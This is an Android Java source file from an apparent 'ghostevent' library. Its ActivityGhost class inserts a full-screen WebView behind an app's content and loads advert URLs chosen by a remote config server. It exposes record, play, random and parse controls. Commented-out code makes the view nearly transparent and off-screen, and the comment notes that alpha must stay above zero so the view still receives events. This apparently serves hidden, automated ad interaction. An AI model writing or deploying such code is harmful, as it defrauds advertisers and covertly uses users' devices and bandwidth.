package com.nicolls.ghostevent.ghost;

import android.app.Activity;
import android.text.TextUtils;
import android.view.View;
import android.view.ViewGroup;

import androidx.annotation.NonNull;

import com.nicolls.ghostevent.ghost.request.model.ConfigModel;
import com.nicolls.ghostevent.ghost.request.network.NetRequest;
import com.nicolls.ghostevent.ghost.request.network.OkHttpRequest;
import com.nicolls.ghostevent.ghost.request.network.model.RequestParams;
import com.nicolls.ghostevent.ghost.utils.GhostUtils;
import com.nicolls.ghostevent.ghost.utils.LogUtil;
import com.nicolls.ghostevent.ghost.view.GhostWebView;

import java.lang.ref.WeakReference;

import io.reactivex.Observable;
import io.reactivex.ObservableEmitter;
import io.reactivex.ObservableOnSubscribe;
import io.reactivex.Observer;
import io.reactivex.android.schedulers.AndroidSchedulers;
import io.reactivex.disposables.Disposable;
import io.reactivex.schedulers.Schedulers;

import static com.nicolls.ghostevent.ghost.utils.Constants.DEFAULT_ADVERT_URL;
import static com.nicolls.ghostevent.ghost.utils.Constants.DEFAULT_INFO_URL;

public class ActivityGhost extends Ghost {
    private static final String TAG = "ActivityGhost";
    private final WeakReference<Activity> activityRef;
    private GhostWebView ghostWebView;
    private String url = DEFAULT_ADVERT_URL;
    private NetRequest requester;

    public ActivityGhost(@NonNull final Activity activity) {
        activityRef = new WeakReference<>(activity);
        requester = new OkHttpRequest();
    }

    @Override
    public void init() {
        Activity activity = activityRef.get();
        if (activity != null) {
            View decorView = activity.getWindow().getDecorView();
            ViewGroup viewGroup = decorView.findViewById(android.R.id.content);
            if (viewGroup == null) {
                viewGroup = (ViewGroup) decorView;
            }
            ghostWebView = new GhostWebView(activity.getApplicationContext());
            ghostWebView.setLayoutParams(new ViewGroup.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT,
                    ViewGroup.LayoutParams.MATCH_PARENT));
//            ghostWebView.setAlpha(0.001f);//不能设置成0，设置成0，将收不到事件，只要还有值 就可以接收到事件
//            ghostWebView.setTranslationX(2500);
            viewGroup.addView(ghostWebView, 0);
            sendRequest();
        }
    }

    private void sendRequest() {
        LogUtil.d(TAG, "sendRequest");
        Observable.create(new ObservableOnSubscribe<ConfigModel>() {
            @Override
            public void subscribe(ObservableEmitter<ConfigModel> emitter) throws Exception {
                LogUtil.d(TAG, "subscribe thread " + Thread.currentThread().getName());
                RequestParams params = new RequestParams.Builder().setUrl(DEFAULT_INFO_URL)
                        .setMethod(RequestParams.METHOD_GET).create();
                ConfigModel configModel = requester.executeRequest(params, ConfigModel.class);
                emitter.onNext(configModel);
                emitter.onComplete();
            }
        }).subscribeOn(Schedulers.io()).observeOn(AndroidSchedulers.mainThread()).subscribe(new Observer<ConfigModel>() {
            @Override
            public void onSubscribe(Disposable d) {
                LogUtil.d(TAG, "onSubscribe thread " + Thread.currentThread().getName());

            }

            @Override
            public void onNext(ConfigModel s) {
                LogUtil.d(TAG, "onNext thread " + Thread.currentThread().getName());
                if (s != null && s.result != null && s.result.enable && !TextUtils.isEmpty(s.result.url)) {
                    LogUtil.d(TAG, "onNext " + s.toString());
                    ghostWebView.start(GhostUtils.getParamsAdvertUrl(s.result.url));
                }
            }

            @Override
            public void onError(Throwable e) {
                LogUtil.d(TAG, "onError thread " + Thread.currentThread().getName());
                ghostWebView.start(GhostUtils.getParamsAdvertUrl(url));
            }

            @Override
            public void onComplete() {
                LogUtil.d(TAG, "onComplete thread " + Thread.currentThread().getName());
            }
        });
    }


    @Override
    public void exit() {
        if (ghostWebView != null) {
            ghostWebView.stop();
            Activity activity = activityRef.get();
            if (activity != null) {
                ViewGroup viewGroup = (ViewGroup) ghostWebView.getParent();
                viewGroup.removeView(ghostWebView);
                ghostWebView = null;
            }
        }
        activityRef.clear();
    }

    @Override
    public void reload() {
        if (ghostWebView != null) {
            ghostWebView.reload();
        }
    }

    @Override
    public void record() {
        if (ghostWebView != null) {
            ghostWebView.record();
        }
    }

    @Override
    public void play() {
        if (ghostWebView != null) {
            ghostWebView.play();
        }
    }

    @Override
    public void goHome() {
        if (ghostWebView != null) {
            ghostWebView.goHome();
        }
    }

    @Override
    public void goBack() {
        if (ghostWebView != null) {
            ghostWebView.runGoBack();
        }
    }

    @Override
    public void parse() {
        if (ghostWebView != null) {
            ghostWebView.onParse();
        }
    }

    @Override
    public void playParse() {
        if (ghostWebView != null) {
            ghostWebView.onPlayParse();
        }
    }

    @Override
    public void random() {
        if (ghostWebView != null) {
            ghostWebView.random();
        }
    }


}
